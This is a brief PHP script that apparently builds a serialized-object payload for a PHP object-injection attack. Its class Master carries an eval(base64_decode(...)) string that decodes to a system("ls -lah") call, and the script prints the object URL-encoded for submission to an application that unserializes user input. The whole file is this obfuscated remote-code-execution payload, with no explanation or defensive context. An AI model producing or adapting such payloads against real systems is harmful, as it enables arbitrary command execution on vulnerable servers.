<?php

class Master{

	private $id = "eval(base64_decode(\"c3lzdGVtKCJscyAtbGFoIik7Cg==\"));";
	#private $id = "base64_decode(\"c3lzdGVtKCJscyAtbGFoIik7Cg==\");";
	private $host;
}

print urlencode(serialize(new Master));




